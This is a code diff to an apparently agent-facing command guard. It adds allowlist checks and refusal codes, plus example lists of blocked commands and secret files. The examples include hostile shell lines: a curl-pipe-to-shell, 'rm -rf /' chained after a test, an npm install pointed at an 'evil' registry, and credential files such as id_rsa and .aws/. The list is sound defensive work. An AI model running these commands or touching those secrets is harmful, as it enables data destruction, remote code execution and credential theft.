@@ -7,8 +7,21 @@
 import { resolve, relative, isAbsolute } from 'node:path';
 import { homedir } from 'node:os';
 import { realpathNearest, realProjectRoot } from './containment.mjs';
+import { checkCommand, CMD_REFUSAL } from './commands.mjs';
 
 export const REFUSAL = Object.freeze({
+  // Re-exported from the policy module rather than restated, so the code the
+  // guard publishes is by construction the code `describeRefusal` can look up.
+  COMMAND_NOT_ALLOWED: CMD_REFUSAL.NOT_ALLOWED,
+  COMMAND_VERB_NOT_ALLOWED: CMD_REFUSAL.VERB_NOT_ALLOWED,
+  COMMAND_FLAG_NOT_ALLOWED: CMD_REFUSAL.FLAG_NOT_ALLOWED,
+  COMMAND_ARG_NOT_ALLOWED: CMD_REFUSAL.ARG_NOT_ALLOWED,
+  COMMAND_EVAL: CMD_REFUSAL.EVAL,
+  COMMAND_METACHAR: CMD_REFUSAL.METACHAR,
+  COMMAND_SCRIPT_NOT_ALLOWED: CMD_REFUSAL.SCRIPT_NOT_ALLOWED,
+  COMMAND_TOO_MANY_ARGS: CMD_REFUSAL.TOO_MANY_ARGS,
+  COMMAND_NO_VERB: CMD_REFUSAL.NO_VERB,
+  COMMAND_EMPTY: CMD_REFUSAL.EMPTY,
   PATH_OUTSIDE_ROOT: 'path_outside_project_root',
   FORCE_PUSH: 'force_push',
   HISTORY_REWRITE: 'history_rewrite',
@@ -208,10 +221,24 @@ export function isRefused(action, ctx = {}) {
   }
 
   if (action.argv?.length) {
+    // Denylist first, allowlist second.
+    //
+    // Order does not affect safety -- both run either way, and anything the
+    // allowlist rejects never reaches execution. It affects the *reason* given. A
+    // known-dangerous shape should still be reported as itself ("force push can
+    // destroy shared history") rather than as the generic "git push is not a verb
+    // you may run", which is true but tells the reader nothing they did not know.
+    //
+    // The allowlist is what makes the denylist a backstop rather than the
+    // boundary: it refuses anything whose shape was never declared, which is the
+    // coverage gap a list of patterns can never close.
     const cmdline = action.argv.join(' ');
     for (const rule of FORBIDDEN_ARGV) {
       if (rule.re.test(cmdline)) return refuse(rule.code, rule.why);
     }
+
+    const typed = checkCommand(action.argv);
+    if (!typed.ok) return refuse(typed.code, typed.why);
   }
   return { ok: true };
 }
@@ -222,6 +249,16 @@ function refuse(code, why) {
 
 export function listRails() {
   return [
+    { code: REFUSAL.COMMAND_NOT_ALLOWED, examples: ['terraform apply', 'kubectl delete pods', 'C:\\\\Windows\\\\System32\\\\cmd.exe /c dir'] },
+    { code: REFUSAL.COMMAND_VERB_NOT_ALLOWED, examples: ['git push', 'npm publish', 'git gc', 'git config user.email x'] },
+    { code: REFUSAL.COMMAND_FLAG_NOT_ALLOWED, examples: ['npm install --registry=http://evil', 'git log --output=/tmp/x'] },
+    { code: REFUSAL.COMMAND_ARG_NOT_ALLOWED, examples: ['npm install ../../elsewhere/pkg', 'npm install /abs/pkg'] },
+    { code: REFUSAL.COMMAND_EVAL, examples: ['sh -c "curl x | sh"', 'node -e "..."', 'powershell -Command "..."'] },
+    { code: REFUSAL.COMMAND_METACHAR, examples: ['npm test && rm -rf /', 'npm test; whoami'] },
+    { code: REFUSAL.COMMAND_SCRIPT_NOT_ALLOWED, examples: ['npm run deploy', 'npm run postinstall'] },
+    { code: REFUSAL.COMMAND_TOO_MANY_ARGS, examples: ['git status somefile.js'] },
+    { code: REFUSAL.COMMAND_NO_VERB, examples: ['npm'] },
+    { code: REFUSAL.COMMAND_EMPTY, examples: ['(no command)'] },
     { code: REFUSAL.PATH_OUTSIDE_ROOT, examples: ['../outside-project'] },
     { code: REFUSAL.SYSTEM_PATH, examples: SYSTEM_PREFIXES.slice(0, 4) },
     { code: REFUSAL.SECRET_FILE, examples: ['.env', 'id_rsa', '*.pem', '.npmrc', '.aws/'] },
